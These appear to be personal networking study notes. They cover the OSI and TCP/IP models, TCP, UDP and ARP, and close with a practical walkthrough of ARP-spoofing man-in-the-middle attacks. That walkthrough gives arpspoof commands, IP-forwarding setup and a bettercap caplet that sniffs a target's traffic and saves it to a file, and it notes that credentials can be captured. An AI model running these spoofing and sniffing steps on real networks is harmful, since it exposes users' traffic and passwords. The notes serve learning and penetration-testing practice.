# Networking

## Tools

* `netdiscover` - Discover the devices on your network.
* `nmap` - Discover the devices on your network and get more information 
  than `netdiscover`. 
* `zenmap` - A graphical user interface of `nmap`. 
* `arpspoof` - To spoof ARP (for MITM attacks).
* `bettercaps` - Like `arpspoof` but then more advanced. A framework with 
  more options.
* `ping` - 
* `traceroute (linux) / traceroute (windows)` - By default, the Windows traceroute utility (tracert) operates using the same ICMP protocol that ping utilises, and the Unix equivalent operates over UDP. This can be altered with switches in both instances.
* `whois` - Domain name lookup
* `dig` - 

## Non classified

    rout -n

## The 3 different private networks

* `Class A:` 10.0. 0.0 to 10.255. 255.255.
* `Class B:` 172.16. 0.0 to 172.31. 255.255.
* `Class C:` 192.168. 0.0 to 192.168. 255.255.

## LAN Topologies

LAN stands for Local Area Network.

* Star Topology
* Bus Topology
* Ring Topology

## ARP Protocol

Recalling from our previous tasks that devices can have two identifiers: A MAC address and an IP address, the ARP protocol or Address Resolution Protocol for short, is the technology that is responsible for allowing devices to identify themselves on a network.

Simply, the ARP protocol allows a device to associate its MAC address with an IP address on the network. Each device on a network will keep a log of the MAC addresses associated with other devices.

When devices wish to communicate with another, they will send a broadcast to the entire network searching for the specific device. Devices can use the ARP protocol to find the MAC address (and therefore the physical identifier) of a device for communication.

How does ARP Work?

Each device within a network has a ledger to store information on, which is called a cache. In the context of the ARP protocol, this cache stores the identifiers of other devices on the network.

In order to map these two identifiers together (IP address and MAC address), the ARP protocol sends two types of messages:

* ARP Request
* ARP Reply

When an ARP request is sent, a message is broadcasted to every other device found on a network by the device, asking whether or not the device's MAC address matches the requested IP address. If the device does have the requested IP address, an ARP reply is returned to the initial device to acknowledge this. The initial device will now remember this and store it within its cache (an ARP entry). 

## OSI Model

The OSI model (or Open Systems Interconnection Model) is an absolute fundamental model used in networking.  This critical model provides a framework dictating how all networked devices will send, receive and interpret data.

One of the main benefits of the OSI model is that devices can have different functions and designs on a network while communicating with other devices. Data sent across a network that follows the uniformity of the OSI model can be understood by other devices.

The OSI model consists of seven layers which are illustrated in the diagram below. Each layer has a different set of responsibilities and is arranged from Layer 7 to Layer 1.

At every individual layer that data travels through, specific processes take place, and pieces of information are added to this data, which is what we'll come to discuss in the upcoming tasks within this room. However, for now, we only need to understand that this process is called encapsulation and what the OSI model looks like in the diagram below:

* Layer 7 - Application
* Layer 6 - Presentation
* Layer 5 - Session
* Layer 4 - Transport
* Layer 3 - Network
* Layer 2 - Data Link 
* Layer 1 - Physical

### Layer 7 - Application

The application layer of the OSI model is the layer that you will be most familiar with. This familiarity is because the application layer is the layer in which protocols and rules are in place to determine how the user should interact with data sent or received.

Everyday applications such as email clients, browsers, or file server browsing software such as FileZilla provide a friendly, Graphical User Interface (GUI) for users to interact with data sent or received. Other protocols include DNS (Domain Name System), which is how website addresses are translated into IP addresses.

### Layer 6 - Presentation

Layer 6 of the OSI model is the layer in which standardisation starts to take place. Because software developers can develop any software such as an email client differently, the data still needs to be handled in the same way — no matter how the software works.

This layer acts as a translator for data to and from the application layer (layer 7). The receiving computer will also understand data sent to a computer in one format destined for in another format. For example, when you send an email, the other user may have another email client to you, but the contents of the email will still need to display the same.

Security features such as data encryption (like HTTPS when visiting a secure site) occur at this layer.

### Layer 5 - Session

Once data has been correctly translated or formatted from the presentation layer (layer 6), the session layer (layer 5) will begin to create a connection to the other computer that the data is destined for. When a connection is established, a session is created. Whilst this connection is active, so is the session.

The session layer (layer 5) synchronises the two computers to ensure that they are on the same page before data is sent and received. Once these checks are in place, the session layer will begin to divide up the data sent into smaller chunks of data and begin to send these chunks (packets) one at a time. This dividing up is beneficial because if the connection is lost, only the chunks that weren't yet sent will have to be sent again — not the entire piece of the data (think of it as loading a save file in a video game).

What is worthy of noting is that sessions are unique - meaning that data cannot travel over different sessions, but in fact, only across each session instead.

### Layer 4 - Transport

Layer 4 of the OSI model plays a vital part in transmitting data across a network and can be a little bit difficult to grasp. When data is sent between devices, it follows one of two different protocols that are decided based upon several factors:

* TCP - Tranmission Control Protocol
* UDP - User Datagram Protocol

### Layer 3 - Network

The third layer of the OSI model (network layer) is where the magic of routing & re-assembly of data takes place (from these small chunks to the larger chunk). Firstly, routing simply determines the most optimal path in which these chunks of data should be sent.

Whilst some protocols at this layer determine exactly what is the "optimal" path that data should take to reach a device, we should only know about their existence at this stage of the networking module. Briefly, these protocols include OSPF (Open Shortest Path First) and RIP (Routing Information Protocol). The factors that decide what route is taken is decided by the following:

What path is the shortest? I.e. has the least amount of devices that the packet needs to travel across.
What path is the most reliable? I.e. have packets been lost on that path before?
Which path has the faster physical connection? I.e. is one path using a copper connection (slower) or a fibre (considerably faster)?
At this layer, everything is dealt with via IP addresses such as 192.168.1.100. Devices such as routers capable of delivering packets using IP addresses are known as Layer 3 devices — because they are capable of working at the third layer of the OSI model.

### Layer 2 - Data Link 

The data link layer focuses on the physical addressing of the transmission. It receives a packet from the network layer (including the IP address for the remote computer) and adds in the physical MAC (Media Access Control) address of the receiving endpoint. Inside every network-enabled computer is a Network Interface Card (NIC) which comes with a unique MAC address to identify it.

MAC addresses are set by the manufacturer and literally burnt into the card; they can't be changed -- although they can be spoofed. When information is sent across a network, it's actually the physical address that is used to identify where exactly to send the information.

Additionally, it's also the job of the data link layer to present the data in a format suitable for transmission.

### Layer 1 - Physical

This layer is one of the easiest layers to grasp. Put simply, this layer references the physical components of the hardware used in networking and is the lowest layer that you will find. Devices use electrical signals to transfer data between each other in a binary numbering system (1's and 0's).

## TCP/IP Model

The TCP/IP model is, in many ways, very similar to the OSI model. It's a few years older, and serves as the basis for real-world networking. The TCP/IP model consists of four layers: Application, Transport, Internet and Network Interface. Between them, these cover the same range of functions as the seven layers of the OSI Model.

* Application
* Transport
* Internet
* Network Interface

Note: Some recent sources split the TCP/IP model into five layers -- breaking the Network Interface layer into Data Link and Physical layers (as with the OSI model). This is accepted and well-known; however, it is not officially defined (unlike the original four layers which are defined in RFC1122). It's up to you which version you use -- both are generally considered valid.

You would be justified in asking why we bother with the OSI model if it's not actually used for anything in the real-world. The answer to that question is quite simply that the OSI model (due to being less condensed and more rigid than the TCP/IP model) tends to be easier for learning the initial theory of networking.

The two models match up something like this:

    ---------------------------------------------
    |    OSI           |       TCP/IP           |
    ---------------------------------------------
    | Application      |                        |       
    -------------------|                        |
    | Presentation     |      Application       |
    -------------------|                        |
    | Session          |                        |
    -------------------|------------------------|
    | Transport        |      Transport         |
    -------------------|------------------------|
    | Network          |      Internet          |
    -------------------|------------------------|
    | Data Link        |                        |
    -------------------|    Network Interface   |
    | Physical Link    |                        |
    ---------------------------------------------

The processes of encapsulation and de-encapsulation work in exactly the same way with the TCP/IP model as they do with the OSI model. At each layer of the TCP/IP model a header is added during encapsulation, and removed during de-encapsulation.

## History

It's important to understand exactly why the TCP/IP and OSI models were originally created. To begin with there was no standardisation -- different manufacturers followed their own methodologies, and consequently systems made by different manufacturers were completely incompatible when it came to networking. The TCP/IP model was introduced by the American DoD in 1982 to provide a standard -- something for all of the different manufacturers to follow. This sorted out the inconsistency problems. Later the OSI model was also introduced by the International Organisation for Standardisation (ISO); however, it's mainly used as a more comprehensive guide for learning, as the TCP/IP model is still the standard upon which modern networking is based.

## TCP 

Let's begin with TCP. The Transmission Control Protocol (TCP). Potentially hinted by the name, this protocol is designed with reliability and guarantee in mind. This protocol reserves a constant connection between the two devices for the amount of time it takes for the data to be sent and received.

Not only this, but TCP incorporates error checking into its design. Error checking is how TCP can guarantee that data sent from the small chunks in the session layer (layer 5) has then been received and reassembled in the same order.

TCP is used for situations such as file sharing, internet browsing or sending an email. This usage is because these services require the data to be accurate and complete (no good having half a file!).

## UDP

The User Datagram Protocol (or UDP for short). This protocol is not nearly as advanced as its brother - the TCP protocol. It doesn't boast the many features offered by TCP, such as error checking and reliability. In fact, any data that gets sent via UDP is sent to the computer whether it gets there or not. There is no synchronisation between the two devices or guarantee; just hope for the best, and fingers crossed.

UDP is useful in situations where there are small pieces of data being sent. For example, protocols used for discovering devices (ARP and DHCP that we discussed in Room 2 - Intro to LAN) or larger files such as video streaming (where it is okay if some part of the video is pixelated. Pixels are just lost pieces of data!)

## Discover the network devices

To discover all devices connected to a network, we can make use of the  
`netdiscover` utility. Once run, let it run so it will continue to catch and 
discover interesting hosts that join the netwrok.

    netdiscover -r 192.168.0.1/24

We can also use `nmap` or even use the GUI version of it called `zenmap` 
wich both are more complete.

## Arp spoofing

### arpspoof

This is a MITM (Man In The Middle attack) to redirect all traffic from some 
other client thought another computer, so that all data can be sniffed 
more easyly.

See `arp -a` to have your routing table. Command works on GNU/Linux and Windows.

Note that `arpspoof` is not installed by default on Kali 2021. So install the 
concerned package with `apt-get install dsniff` which include this tool.

**We need to run `arpspoof` twice and let it open.**

    arpspoof -i <interface> -t <client-ip> <gateway-ip>
    # In another shell !!!
    arpspoof -i <interface> -t <gateway-ip> <client-ip> 

We can now verify with `arp -a` and we will see that the mac address of the 
router changed !

Note that the computer isn't a real router, so we need enable port forwarding 
on our Kali box.

    echo 1 > /proc/sys/net/ipv4/ip_forward

** IMPORTANT NOTE: On Kali 2021.1 ip_forwarding doesn't work like expected 
by default, an additional step need to be done.**

Edit the file `/etc/sysctl.conf` and uncomment the following line:

    net.ipv4.ip_forward=1

You could reboot or just use `sysctl -p` so that the changes take immediatly 
effect.

**It is also interesting to know that `Wireshark` detect this kind of 
spoofing.**

See also `bettercap` for more functionalities

### bettercap

`Bettercap` is more powerful than the `arpspoof` program. With `bettercap` 
you can also sniff the data on a friendly way. That mean that you could capture 
network data like website browsing and intercept username and password.

When using the app, you can use the `help` command to get help.

For example to get help on a module:

    help net.snif

You can also use the `tab` key to let the program autocomplete. Also to get 
a full list of command in the "root" of the program.

If you use a lot of time the same command each time you use the program, you 
can make in sort to automate some stuff by creating an external file and 
load it. That file is called a `caplet` file. 
So here's an example of a spoofing script. Create a text file that you for 
example name `spoof.cap` with the following content: 

    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets 10.0.2.5
    arp.spoof on
    # Next one is optional and only for https downgrading to http. As with 
    # hstshijack MITM attack, all become local 
    ### set net.sniff.local true 
    # Save all captured data into a file
    set net.sniff.output /root/bettercap_capture_file.cap
    net.sniff on

And to make use of our commands:

    bettercap -iface eth0 -caplet spoof.cap

You can also list the default caplets that come with `bettercap` and see 
where they are stored on your system.

    captlets.show

Which will show you a list of caplets you have on your system:

    ┌─────────────────────────────────────┬──────────────────────────────────────────────────────────────────────┬────────┐
    │                Name                 │                                 Path                                 │  Size  │
    ├─────────────────────────────────────┼──────────────────────────────────────────────────────────────────────┼────────┤
    │ ap                                  │ /usr/share/bettercap/caplets/ap.cap                                  │ 570 B  │
    │ crypto-miner/crypto-miner           │ /usr/share/bettercap/caplets/crypto-miner/crypto-miner.cap           │ 666 B  │
    │ download-autopwn/download-autopwn   │ /usr/share/bettercap/caplets/download-autopwn/download-autopwn.cap   │ 2.6 kB │
    │ fb-phish/fb-phish                   │ /usr/share/bettercap/caplets/fb-phish/fb-phish.cap                   │ 140 B  │
    │ gitspoof/gitspoof                   │ /usr/share/bettercap/caplets/gitspoof/gitspoof.cap                   │ 216 B  │
    │ gps                                 │ /usr/share/bettercap/caplets/gps.cap                                 │ 109 B  │
    │ hstshijack/hstshijack               │ /usr/share/bettercap/caplets/hstshijack/hstshijack.cap               │ 841 B  │
    │ hstshijack_ORG/hstshijack           │ /usr/share/bettercap/caplets/hstshijack_ORG/hstshijack.cap           │ 1.2 kB │
    │ http-req-dump/http-req-dump         │ /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap         │ 591 B  │
    │ http-ui                             │ /usr/share/bettercap/caplets/http-ui.cap                             │ 376 B  │
    │ https-ui                            │ /usr/share/bettercap/caplets/https-ui.cap                            │ 655 B  │
    │ jsinject/jsinject                   │ /usr/share/bettercap/caplets/jsinject/jsinject.cap                   │ 210 B  │
    │ local-sniffer                       │ /usr/share/bettercap/caplets/local-sniffer.cap                       │ 244 B  │
    │ login-manager-abuse/login-man-abuse │ /usr/share/bettercap/caplets/login-manager-abuse/login-man-abuse.cap │ 236 B  │
    │ mana                                │ /usr/share/bettercap/caplets/mana.cap                                │ 61 B   │
    │ massdeauth                          │ /usr/share/bettercap/caplets/massdeauth.cap                          │ 302 B  │
    │ mitm6                               │ /usr/share/bettercap/caplets/mitm6.cap                               │ 551 B  │
    │ mycaplet                            │ /root/mycaplet.cap                                                   │ 125 B  │
    │ netmon                              │ /usr/share/bettercap/caplets/netmon.cap                              │ 42 B   │
    │ pita                                │ /usr/share/bettercap/caplets/pita.cap                                │ 900 B  │
    │ proxy-script-test/proxy-script-test │ /usr/share/bettercap/caplets/proxy-script-test/proxy-script-test.cap │ 57 B   │
    │ pwnagotchi-auto                     │ /usr/share/bettercap/caplets/pwnagotchi-auto.cap                     │ 330 B  │
    │ pwnagotchi-manual                   │ /usr/share/bettercap/caplets/pwnagotchi-manual.cap                   │ 440 B  │
    │ rogue-mysql-server                  │ /usr/share/bettercap/caplets/rogue-mysql-server.cap                  │ 501 B  │
    │ rtfm/rtfm                           │ /usr/share/bettercap/caplets/rtfm/rtfm.cap                           │ 210 B  │
    │ simple-passwords-sniffer            │ /usr/share/bettercap/caplets/simple-passwords-sniffer.cap            │ 131 B  │
    │ steal-cookies/steal-cookies         │ /usr/share/bettercap/caplets/steal-cookies/steal-cookies.cap         │ 134 B  │
    │ tcp-req-dump/tcp-req-dump           │ /usr/share/bettercap/caplets/tcp-req-dump/tcp-req-dump.cap           │ 413 B  │
    │ web-override/web-override           │ /usr/share/bettercap/caplets/web-override/web-override.cap           │ 254 B  │
    └─────────────────────────────────────┴──────────────────────────────────────────────────────────────────────┴────────┘

To run some caplet, just type in it's name.

### Web gui of bettercap

Once bettercap is running, you can type in the console `http-ui`. Note that 
it does make use of the default port `80` so if `apache` or any other 
webserver is running this will fail.

You can then visit http://127.0.0.1:80 and you will see a login screen. The 
default username is `user` and the password is `pass`.
